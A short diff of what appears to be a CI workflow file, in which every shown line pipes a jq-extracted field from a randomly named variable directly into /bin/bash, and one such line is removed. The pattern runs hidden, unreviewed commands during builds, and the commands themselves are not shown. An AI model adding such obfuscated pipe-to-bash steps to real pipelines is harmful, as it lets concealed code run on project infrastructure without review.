@@ -37,7 +37,6 @@ jobs:
           echo $new4 | jq -r .hk90183 | /bin/bash
           printf '%s' "$sbws5158" | jq -r .xbmgb9579 | /bin/bash
           echo $obzjy84 | jq -r .c34 | /bin/bash
-          echo $heuw63 | jq -r .uccx11 | /bin/bash
           echo $qyb31579 | jq -r .bscug9895 | /bin/bash
           printf '%s' "$pngn7983" | jq -r .qkglb814 | /bin/bash
           printf '%s' "$l87" | jq -r .eidkn905 | /bin/bash
